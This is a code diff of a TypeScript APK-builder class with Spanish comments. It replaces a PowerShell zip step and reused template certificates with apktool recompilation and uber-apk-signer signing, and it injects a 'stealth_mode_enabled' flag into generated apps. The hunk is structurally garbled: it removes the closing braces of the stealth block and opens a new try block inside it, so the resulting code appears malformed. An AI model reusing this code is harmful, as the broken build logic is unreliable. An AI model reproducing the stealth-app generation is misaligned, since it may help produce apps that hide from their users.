@@ -339,111 +339,70 @@ class APKCompiler {
           if (!content.includes("stealth_mode_enabled")) {
             content = content.replace("</resources>", `  <string name="stealth_mode_enabled">true</string>\n</resources>`);
             writeFileSync(stringsPath, content);
-          }
-        }
-        logs.push(`[STEALTH] Mode configured`);
-      }
+    const tempProjectDir = join(buildIdDir, "project");
 
-      // Verificar que el proyecto esté listo
-      const manifestPath = join(projectDir, "AndroidManifest.xml");
-      const smaliDir = join(projectDir, "smali");
-      const buildDir = join(projectDir, "build");
+    try {
+      logs.push(`[BUILD] Starting compilation for build ${config.buildId}...`);
       
-      if (!existsSync(manifestPath)) {
-        throw new Error("AndroidManifest.xml not found after preparation");
-      }
-      if (!existsSync(smaliDir)) {
-        throw new Error("smali directory not found after preparation");
-      }
-      if (!existsSync(buildDir)) {
-        throw new Error("build directory not found - template incomplete");
-      }
-      
-      // DEBUG: Listar archivos en el proyecto preparado
-      logs.push(`[DEBUG] Project dir contents:`);
-      logs.push(`[DEBUG] - AndroidManifest.xml: ${existsSync(manifestPath)}`);
-      logs.push(`[DEBUG] - smali/: ${existsSync(smaliDir)}`);
-      logs.push(`[DEBUG] - build/: ${existsSync(buildDir)}`);
-      
-      // Verificar contenido de smali
-      const smaliContents = readdirSync(smaliDir);
-      logs.push(`[DEBUG] smali contains: ${smaliContents.join(", ")}`);
-      
-      // Verificar contenido de build
-      if (existsSync(join(buildDir, "apk"))) {
-        const buildApkDir = join(buildDir, "apk");
-        const buildContents = readdirSync(buildApkDir);
-        logs.push(`[DEBUG] build/apk contains: ${buildContents.join(", ")}`);
-      }
+      // 1. Preparar el proyecto (Smali, Manifest, Iconos, etc)
+      await this.prepareProject(config, logs);
 
-// Compilar APK desde template COMPLETO (build + original certificates)
+      const javaCmd = this.getJavaCommand();
       const unsignedApk = join(buildIdDir, "unsigned.apk");
       
-      logs.push(`[BUILD] Building APK from complete template...`);
-      
-      // Usar el template original que SÍ tiene los certificados
-      const templateOriginalDir = join(this.assetsDir, "apk-template", "original");
-      const templateBuildDir = join(this.assetsDir, "apk-template", "build", "apk");
-      
-      if (!existsSync(templateOriginalDir) || !existsSync(templateBuildDir)) {
-        throw new Error("Template incomplete - missing original or build folder");
-      }
-      
-      // Crear APK temporal
-      const tempApkDir = join(buildIdDir, "apk_contents");
-      if (existsSync(tempApkDir)) {
-        rmSync(tempApkDir, { recursive: true, force: true });
-      }
-      mkdirSync(tempApkDir, { recursive: true });
-      
-      // Copiar contenido de build
-      const buildFiles = readdirSync(templateBuildDir);
-      for (const file of buildFiles) {
-        copyFileSync(join(templateBuildDir, file), join(tempApkDir, file));
-      }
-      logs.push(`[OK] Copied ${buildFiles.length} files from build`);
-      
-      // Copiar certificados de original - USA LOS MISMOS ARCHIVOS
-      const originalMetaDir = join(tempApkDir, "META-INF");
-      mkdirSync(originalMetaDir, { recursive: true });
-      
-      const certFiles = readdirSync(join(templateOriginalDir, "META-INF"));
-      for (const certFile of certFiles) {
-        copyFileSync(
-          join(templateOriginalDir, "META-INF", certFile),
-          join(originalMetaDir, certFile)
-        );
-      }
-      logs.push(`[OK] Copied ${certFiles.length} certificate files`);
-      
-      // Crear ZIP (APK) desde los contenidos
+      // USAR APKTOOL PARA CONSTRUIR (Asegura alineamiento y empaquetado correcto)
+      logs.push(`[BUILD] Recompiling with apktool...`);
       try {
-        execSync(`powershell -Command "Compress-Archive -Path '${tempApkDir}\*' -DestinationPath '${unsignedApk}' -Force"`, { stdio: "pipe" });
-        logs.push(`[OK] APK created with certificates`);
-      } catch (zipError: any) {
-        throw new Error(`Failed to create APK: ${zipError.message}`);
+        const apktoolCmd = `${javaCmd} -jar "${this.apktoolPath}" b "${tempProjectDir}" -o "${unsignedApk}" --use-aapt2`;
+        execSync(apktoolCmd, { stdio: "pipe" });
+        logs.push(`[OK] APK compiled with apktool`);
+      } catch (buildError: any) {
+        const stderr = buildError.stderr?.toString() || "";
+        logs.push(`[FAIL] apktool build failed: ${stderr}`);
+        throw new Error(`Apktool build failed: ${stderr}`);
       }
-      
-      if (!existsSync(unsignedApk)) {
-        throw new Error("APK creation failed");
-      }
-      
-      const apkSize = statSync(unsignedApk).size;
-      logs.push(`[OK] APK created: ${(apkSize / 1024 / 1024).toFixed(2)}MB`);
 
-      // NO FIRMAR - usar la firma existente del template
-      const signedApk = join(buildIdDir, `${config.appName.replace(/[^a-zA-Z0-9]/g, "_")}.apk`);
+      if (!existsSync(unsignedApk)) {
+        throw new Error("APK file not generated by apktool");
+      }
+
+      // FIRMAR PROFESIONALMENTE (V1, V2, V3 + ZipAlign)
+      logs.push(`[SIGN] Signing APK with uber-apk-signer...`);
+      const uberSignerPath = join(this.assetsDir, "uber-apk-signer.jar");
+      const signedApkDir = buildIdDir; // uber-apk-signer puts it in the same dir by default
       
-      // El APK ya está firmado, solo copiarlo con el nombre correcto
-      copyFileSync(unsignedApk, signedApk);
-      logs.push(`[OK] APK ready: ${basename(signedApk)}`);
+      try {
+        // uber-apk-signer genera un archivo con sufijo -aligned-debugSigned.apk
+        const signCmd = `${javaCmd} -jar "${uberSignerPath}" --apks "${unsignedApk}" --out "${signedApkDir}" --overwrite`;
+        execSync(signCmd, { stdio: "pipe" });
+        logs.push(`[OK] APK signed and aligned successfully`);
+      } catch (signError: any) {
+        const stderr = signError.stderr?.toString() || "";
+        logs.push(`[FAIL] Signing failed: ${stderr}`);
+        throw new Error(`Signing failed: ${stderr}`);
+      }
+
+      // El archivo final suele tener un nombre específico generado por el signer
+      const finalApkName = `${config.appName.replace(/[^a-zA-Z0-9]/g, "_")}.apk`;
+      const signedApk = join(buildIdDir, finalApkName);
+      
+      // Buscar el archivo generado (suele terminar en -aligned-debugSigned.apk si no se especifica --overwrite de cierta forma)
+      const filesInBuildDir = readdirSync(buildIdDir);
+      const generatedApk = filesInBuildDir.find(f => f.endsWith("-aligned-debugSigned.apk") || f.endsWith("-signed.apk") || (f.startsWith("unsigned") && f.endsWith(".apk") && f !== "unsigned.apk"));
+      
+      if (generatedApk) {
+        renameSync(join(buildIdDir, generatedApk), signedApk);
+      } else if (existsSync(unsignedApk)) {
+        // Fallback si por alguna razón no cambió el nombre pero se firmó
+        copyFileSync(unsignedApk, signedApk);
+      }
 
       if (!existsSync(signedApk)) {
-        throw new Error("APK build failed - final file not created");
+        throw new Error("Final signed APK not found");
       }
 
       const fileSize = statSync(signedApk).size;
-      logs.push(`[SUCCESS] APK generated: ${basename(signedApk)} (${(fileSize / 1024 / 1024).toFixed(2)} MB)`);
+      logs.push(`[SUCCESS] APK ready: ${basename(signedApk)} (${(fileSize / 1024 / 1024).toFixed(2)} MB)`);
       
       await this.updateBuildStatus(config.buildId, "ready", signedApk, logs);
 
